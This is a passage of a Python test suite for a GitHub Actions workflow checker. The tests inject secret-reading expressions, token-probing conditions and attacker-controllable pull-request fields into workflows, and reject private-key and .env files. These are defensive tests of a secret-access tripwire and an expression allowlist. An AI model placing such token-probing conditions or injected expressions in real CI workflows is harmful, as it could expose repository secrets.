                        job["container"] = {"image": "ghcr.io/x/y", "credentials": {"username": "x", "password": form}}
                    elif level == "step-name":
                        job["steps"][-1]["name"] = f"Run {form}"
                    elif level == "step-if":
                        job["steps"][-1]["if"] = form
                    elif level == "step-env":
                        job["steps"][-1]["env"] = {"NPM_TOKEN": form}
                    elif level == "step-with":
                        job["steps"][0]["with"]["token"] = form
                    else:
                        job["steps"][-1]["run"] += f"\necho {form}"
                    with self.assertRaisesRegex(ValueError, "secrets"):
                        checker.validate_workflow(".github/workflows/ci.yml", json.dumps(workflow).encode())
                    # The tripwire regex alone also refuses every form, so a widened allowlist
                    # could not admit a secret-bearing expression.
                    self.assertIsNotNone(checker.WORKFLOW_SECRET_ACCESS.search(json.dumps(workflow)), form)
        # A workflow that merely mentions a "secretsmanager" tool, the word "token" or a
        # script named check_secrets is not flagged.
        workflow = json.loads(generator.workflow("web"))
        workflow["jobs"]["ci"]["steps"][-1]["run"] += "\necho secretsmanager tokens github_token\npython check_secrets.py"
        checker.validate_workflow(".github/workflows/ci.yml", json.dumps(workflow).encode())

    def test_only_generator_expressions_and_no_conditions_are_accepted(self):
        # Every expression in every generated workflow is in the checker allowlist and vice versa.
        emitted = set()
        for repo in generator.PROFILES["repositories"]:
            for setup in (False, True):
                for text in checker.workflow_strings(json.loads(generator.workflow(repo, setup=setup))):
                    emitted.update(re.findall(r"\$\{\{.*?\}\}", text))
        self.assertEqual(emitted, checker.WORKFLOW_EXPRESSIONS)
        self.assertEqual(3, len(checker.WORKFLOW_EXPRESSIONS))
        for expression in checker.WORKFLOW_EXPRESSIONS:
            self.assertRegex(expression, r"^\$\{\{ github\.[a-z_.]+( \|\| github\.[a-z_.]+)? \}\}$")
            self.assertIsNone(checker.WORKFLOW_SECRET_ACCESS.search(expression))
        # Any other expression is refused even when it names no secret, at any level.
        unreviewed = ("${{ github.ref }}", "${{ github.sha }}", "${{ github.workflow }}-${{ github.ref }}",
                      "${{ github.event.pull_request.title }}", "${{ github.actor }}", "${{ runner.os }}",
                      "${{ inputs.ref }}", "${{ env.HOME }}", "${{ vars.X }}", "${{github.workflow}}",
                      "${{ GITHUB.WORKFLOW }}", "${{  github.workflow  }}", "${{ github.workflow",
                      "${{ github.event.pull_request.number||github.ref }}", "${{ toJSON(github.event) }}",
                      "${{ github.event.pull_request.base.sha || github.sha }}x${{ github.event }}")
        for expression in unreviewed:
            for level in ("run", "env", "with", "name", "concurrency"):
                with self.subTest(expression=expression, level=level):
                    workflow = json.loads(generator.workflow("api"))
                    job = workflow["jobs"]["ci"]
                    if level == "run":
                        job["steps"][-2]["run"] += f"\necho '{expression}'"
                    elif level == "env":
                        job["steps"][-1]["env"]["BASE_SHA"] = expression
                    elif level == "with":
                        job["steps"][1]["with"]["python-version"] = expression
                    elif level == "name":
                        workflow["name"] = expression
                    else:
                        workflow["concurrency"]["group"] = expression
                    with self.assertRaisesRegex(ValueError, "unreviewed workflow expression"):
                        checker.validate_workflow(".github/workflows/ci.yml", json.dumps(workflow).encode())
        # Conditions evaluate expressions without `${{`, so none may exist; a token-bearing
        # condition additionally trips the secret-access regex.
        for level, condition in (("job", "always()"), ("job", "github.token != ''"), ("step", "toJSON(github)"),
                                 ("step", "true"), ("step", "startsWith(github.token, 'g')")):
            with self.subTest(level=level, condition=condition):
                workflow = json.loads(generator.workflow("web"))
                target = workflow["jobs"]["ci"] if level == "job" else workflow["jobs"]["ci"]["steps"][-1]
                target["if"] = condition
                message = "conditions" if condition in ("always()", "true") else "secrets"
                with self.assertRaisesRegex(ValueError, message):
                    checker.validate_workflow(".github/workflows/ci.yml", json.dumps(workflow).encode())
        for repo in generator.PROFILES["repositories"]:
            for setup in (False, True):
                checker.validate_workflow(f".github/workflows/{'copilot-setup-steps' if setup else 'ci'}.yml",
                                          generator.workflow(repo, setup=setup).encode())

    def test_sensitive_key_material_files_are_rejected(self):
        for name in ("release.jks", "app/keystore.bks", "certs/server.pem", "upload.keystore", "id_rsa", ".env",
                     "Release.JKS"):
            with self.subTest(name=name):
                errors = checker.check({name: b"binary"})
                self.assertTrue(any("Sensitive file" in item for item in errors), errors)
        self.assertFalse(any("Sensitive file" in item for item in checker.check({"README.md": b"x", ".env.example": b"x"})))

    def test_unimplemented_repositories_are_explicit(self):
        # Words that would turn a scope statement into an acceptance or release claim.
        claims = re.compile(
            r"\b(accept(?:ed|s)?|approv(?:ed|al)|production[- ]ready|complete[ds]?|finished|"
            r"released?|shipped|live|verified|passe[sd]|done|stable|ready)\b", re.IGNORECASE)
        # Every repository with a scaffold names its origin: the Sprint 01 issue, or for api the
        # reviewed initial import recorded in PUBLIC_SETUP.md. The state may describe the scaffold
        # but must still say what is not implemented and must not read as acceptance.
        scaffolds = {"admin": "PenniLogic/admin#1", "ai-service": "PenniLogic/ai-service#1",
                     "android": "PenniLogic/android#1", "web": "PenniLogic/web#1",
                     "contracts": "PenniLogic/contracts#2", "api": "from the reviewed initial import"}
        other = {".github", "docs", "infra"}
        self.assertEqual(set(generator.PROFILES["repositories"]), set(scaffolds) | other)
        for repo, origin in scaffolds.items():
            state = generator.PROFILES["repositories"][repo]["state"]
            with self.subTest(repo=repo):
                self.assertIn("scaffold", state)
                self.assertIn(origin, state)
                self.assertRegex(state, r"no [a-z\-]+[^.;]* (?:is|are) implemented")
                self.assertIsNone(claims.search(state.replace("acceptance is claimed", "")), state)
        self.assertIn("no physical-device acceptance is claimed", generator.PROFILES["repositories"]["android"]["state"])
        self.assertIsNotNone(claims.search("Scaffold accepted; no product is implemented."))
        self.assertIsNotNone(claims.search("Approved scaffold from PenniLogic/web#1; no screens are implemented."))
        self.assertIsNotNone(claims.search("Accepted health-service scaffold only. Product APIs are not implemented."))
        self.assertIn("The accepted executable application scaffold is the API's Kotlin/Ktor",
                      (HERE.parent / "PUBLIC_SETUP.md").read_text(encoding="utf-8"))

    def test_infra_runs_its_application_tests_and_links_the_runbook(self):
        profile = generator.PROFILES["repositories"]["infra"]
        self.assertEqual("python -m unittest discover -s scripts/tests", profile["commands"][-1])
        self.assertEqual("LOCAL_INFRASTRUCTURE.md", profile["developer_guide"])
        output = generator.artifacts("infra")
        for name in ("README.md", "AGENTS.md", "CONTRIBUTING.md"):
            self.assertIn("[LOCAL_INFRASTRUCTURE.md](LOCAL_INFRASTRUCTURE.md)", output[name])
            self.assertIn("python -m unittest discover -s scripts/tests\n```", output[name])
        steps = json.loads(output[".github/workflows/ci.yml"])["jobs"]["ci"]["steps"]
        self.assertTrue(steps[-1]["run"].endswith("\npython -m unittest discover -s scripts/tests"))
        self.assertTrue((HERE.parent / "LOCAL_INFRASTRUCTURE.md").is_file())
        self.assertTrue((HERE.parent / "scripts/tests").is_dir())

    def test_contracts_profile_matches_its_generated_setup_request(self):
        # Every value is copied from PenniLogic/contracts#2 comment 5905425858; nothing is added.
        profile = generator.PROFILES["repositories"]["contracts"]
        self.assertEqual({
            "id": 1394134505, "purpose": "Versioned API contracts and shared schemas", "state": CONTRACTS_STATE,
            "node": "24.14.0", "java": "21", "timeout_minutes": 30, "developer_guide": "docs/development.md",
            "ignore": [".toolchain/", ".kotlin/", ".mypy_cache/", "*.tsbuildinfo"],
            "attributes": ["smoke/kotlin/gradlew.bat text eol=crlf"],
            "install": ["npm ci --no-audit --no-fund", "python scripts/toolchain.py install"],
            "commands": CONTRACTS_COMMANDS,
        }, profile)
        # Publication is versioned git tags plus consumer-side generation, performed outside CI: no
        # publish, release, registry or federated-credential step enters the profile, and the token
        # stays read-only.
        for line in profile["commands"] + profile["install"]:
            self.assertNotRegex(line, r"(?i)publish|release|registry|id-token|oidc|docker push|gh ")
        # Kotlin, TypeScript and Python are generated together, then smoke-tested in the requested order.
        smoke = [line for line in profile["commands"] if line.startswith("python scripts/smoke.py ")]
        self.assertEqual(["python scripts/smoke.py python", "python scripts/smoke.py typescript",
                          "python scripts/smoke.py kotlin"], smoke)
        self.assertLess(profile["commands"].index("python scripts/generate_clients.py --verify"),
                        profile["commands"].index(smoke[0]))
        for setup, job_name in ((False, "ci"), (True, "copilot-setup-steps")):
            workflow = json.loads(generator.workflow("contracts", setup=setup))
            self.assertEqual({"contents": "read"}, workflow["permissions"])
            job = workflow["jobs"][job_name]
            self.assertNotIn("permissions", job)
            self.assertNotIn("env", job)
            self.assertEqual(30, job["timeout-minutes"])
            names = [step["name"] for step in job["steps"]]
            if setup:
                self.assertEqual(["Checkout", "Python", "Node", "JDK", "Verify repository", "Install dependencies",
                                  "Install managed hook"], names)
                self.assertEqual("npm ci --no-audit --no-fund\npython scripts/toolchain.py install", job["steps"][5]["run"])
            else:
                self.assertEqual(["Checkout", "Python", "Node", "JDK", "Run checks"], names)
            # The breaking-change baseline is read from already-fetched v* tags, so the full history stays.
            self.assertEqual({"persist-credentials": False, "fetch-depth": 0}, job["steps"][0]["with"])
            self.assertEqual({"node-version-file": ".nvmrc"}, job["steps"][2]["with"])
            self.assertEqual({"distribution": "temurin", "java-version": "21"}, job["steps"][3]["with"])
        output = generator.artifacts("contracts")
        self.assertEqual(CONTRACTS_COMMANDS, json.loads(output[".github/agent-policy.json"])["commands"])
        for name in ("README.md", "AGENTS.md", "CONTRIBUTING.md"):
            self.assertIn(CONTRACTS_STATE, output[name])
            self.assertIn("[docs/development.md](docs/development.md)", output[name])


if __name__ == "__main__":
    unittest.main()
